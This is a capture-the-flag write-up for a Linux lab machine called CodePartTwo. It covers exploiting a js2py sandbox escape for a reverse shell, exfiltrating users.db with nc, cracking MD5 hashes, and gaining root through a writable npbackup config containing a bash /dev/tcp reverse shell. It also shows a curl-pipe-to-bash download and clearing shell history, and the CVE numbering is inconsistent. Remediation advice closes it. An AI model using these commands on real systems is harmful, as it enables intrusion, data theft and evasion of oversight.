# CodePartTwo

**Machine Name**: CodePartTwo

**Machine OS**: Linux

**Difficulty**: Easy

## Introduction



## Information Gathering

Initial information that we got is the IP **10.10.11.82.** Tried to curl on the IP but got no result, so I initiated to do network scanning.

### TCP Scan

With **nmap**, do network scanning with full TCP and fast scan.

```
nmap -sT -T4 10.10.11.87 -vvv 
```

The output shows that SSH and alternative HTTP service is open on port 22 and 8000. I assume that the attack vector will be on the web application.

```
PORT      STATE     SERVICE         REASON
22/tcp   open     ssh            syn-ack
8000/tcp open     http-alt       syn-ack
```

Upon accessing the website, there are some buttons to do login, register, and download the application that give us advantage to learn about the program and identify the potential vulnerability that may exist.

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

The zip files has one main file named as **app.py**, a db named **users.db** that may contain users' account data, and a requirements file **requirements.txt** for directing the specific package that needed to be installed to make the web app worked. This three main files is what we need to focus on to gather some potential vulnerability.&#x20;

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Try to register and do login to get information about the context of the web app and what they do. In shorts, the web application's intention is a code editor that will convert our javascript code into python code by supply in the text box and can do two options: **save code** to enable look it up later and **run code** to run the supplied code and put the output of the code in the **output** section.

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

leaked secret keys in **app.py** may enable attacker to forge session lead to account takeover.

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

No input sanitization in endpoint **/run\_code** and any malicious crafted code can directly be run, potential serious vulnerability.

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>



{% hint style="info" %}
From here, I got a vision that if the text box is supplied with some malicious code that will run Python code inside the sandbox to get out of it and run reverse shell so I can take control of the web app server.
{% endhint %}

## Enumeration

First, the **requirements.txt** file contains some modules that need to be download, which are flask, flask-sqlalchemy, and **js2py** with **version 0.74** library that caught my attention and tried to look it up. Turned out, this module is vulnerable to **CVE-2024-39205** that allows attacker to obtain a reference to a Python object and enable attacker to escape from the sandbox, bypass pyimport restrictions, and run malicious code. The exploit similar to Server Side Template Injection (SSTI) with some bruteforcing to find a way to access some arbitrary object.

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

The attack vector is in endpoint **POST /run\_code** which enable attacker to turn javacsript code into python code like the image below.&#x20;

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

## Gaining Access

Using the tool created by [**0xDTC**](https://github.com/0xDTC/js2py-Sandbox-Escape-CVE-2024-28397-RCE/tree/master) as a PoC for **CVE-2024-39205,** I able to gained access to the system as **app** user. Before use the tool, create a listener from the attacker machine to catch the reverse shell.

<div align="left"><figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure></div>

<div align="right"><figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure></div>

After compromised the system and act as **app** user, the next step is to escalate the privilege as a user who has access to the system. Remember about the **users.db** path that appeared in the downloaded source code before is under **app/instance/users.db**. The idea is to fetch the db into our machine.

### From Attacker Machine

The attacker machine wait the file on listening mode under the same file name.

```bash
nc -nvlp [port] > users.db
```

### From Victim Machine

The victim machine will send the file to the attacker machine.

```bash
nc -n [attacker IP] [port] < users.db
```

Here we got information in user table that stored the username and password in hash.

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

To analyze the given hash, if you're not sure which type it is, go to [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) to check for the hash. Here it shows that the hash type is MD5 with 128 bit length and 32 character length.

put both the username and password hash in a .txt file and separate them with a colon ( : ), example username:password. Try to crack the hash using hashcat with the given command:

```bash
hashcat -a 0 -m 0 --username hash.txt /usr/share/wordlists/rockyou.txt 
```

After the hash has been cracked, try to log in the SSH as the exact username for the hash.

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation

To escalate into a root user, the system need to be assess comprehensively. Run **linpeas** tool to enumerate linux machine to find any potential attack vector and vulnerability that may exists. In here I used my own machine as the server to get the **linpeas.sh** file, download, and run it to direct assess the system. Make sure the linpeas file is ready and set up the attacker machine using Python **http.server** module.

### Attacker Machine

```
python3 -m http.server 7000 --bind 0.0.0.0
```

### Victim Machine

```
curl [attacker machine]:[port]/linpeas.sh|bash

```

Apparently, the sudo version 1.8.31 is deprecated and may include several serious potential vulnerability. Upon checking for any exploit, turn out it may vulnerable to **CVE-2021-3156** that exploit the **sudoedit** default configuration. From PoC by author [**Whiteh4twolf**](https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit) to test if the machine vulnerable to this CVE, run `sudoedit -s Y`. If it asks for password, most likely it is vulnerable to the CVE. But if it shows the usage, the machine is not vulnerable.

I tested the victim machine and it shows the usage information, therefore I pass this attack vector.&#x20;

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

From the assessment also gave a **95%** vulnerable to **CVE-2021-3560,** an authentication bypass on **polkit** which allow unprivileged user to call privileged methods using DBus. the PoC by [**tufanturhan**](https://github.com/tufanturhan/Polkit-Linux-Priv) allows the attacker to create and modify user permissions to act as root and compromised the system.

Unfortunately, the machine is not vulnerable due to restrict access to create ser and denied any further action.

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>



This part may be the real deal because of miss configuration that allows any user without root capabilities and password to run a binary that can call arbitrary service that pose as root. **npbackup-cli** or **NPBackup** is a secure and efficient file backup solution that can fit both system administrators using CLI or end users with GUI that can handle multiple repositories or groups in order to execute scheduled checks to do backup.

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Upon checking the file permissions, turned out the **npbackup.conf** which act as the backup file configuration is writeable as **marco** user which mean the attacker can write arbitrary command to exploit the miss configuration that lies in the system to gain access as a root user.

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

I read the **npbackup.conf** file and found several interesting configuration that allows the  user to run a command before and/or after the execution of the service. This part become the attack vector because of miss configuration that allows any user to execute **npbackup-cli** and write **npbackup.conf** file.

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

I create a shell script named **test.sh** that contain a reverse shell directed to the attacker machine that will be run before the **npbackup-cli** service is start.

{% code title="test.sh" %}
```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/[attacker IP]/[port] 0>&1
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

I choose **pre\_exec\_commands** that the reverse shell will be run before backup process is started so my file will be executed to escalate the privilege.

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Run the npbackup-cli with the following commands to make sure the backup process is run and pass any failure:

```
sudo npbackup-cli --config npbackup.conf --backup --force
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

On attacker machine, set up the listener and **tadaaaa**\~

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**pwned.**
{% endhint %}

## Clearing Logs

to clear the logs in linux machine, simply use the history command.

```
history -c
```

This only effective if the .bash\_history set to **/dev/null.**

## Remediation

To remediate the following issue, do the following action:

* Update **js2py** module to newer version or patch via github [**Marven11**](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape) immediately.
* **Sanitize any user input validation** and use whitelist or blacklist on several word that may harm the code.
* **Remove any hardcoded secret keys in source code** to avoid tampering and use a strong secrets keys.
* **Use a proper cryptography algorithms** to ensure the hash on the DB cannot be cracked by anyone.
* **Implement least privilege** and don't let any user have a capability to do anything without password and sudo command.
* **Frequently do evaluation to check on any configuration** and file permission.

## Reference

{% embed url="https://github.com/0xDTC/js2py-Sandbox-Escape-CVE-2024-28397-RCE/tree/master" %}
payload RCE that I used to gain access
{% endembed %}

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}

{% embed url="https://github.com/netinvent/npbackup" %}

{% embed url="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape" %}

{% embed url="https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit" %}

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2024-28397" %}
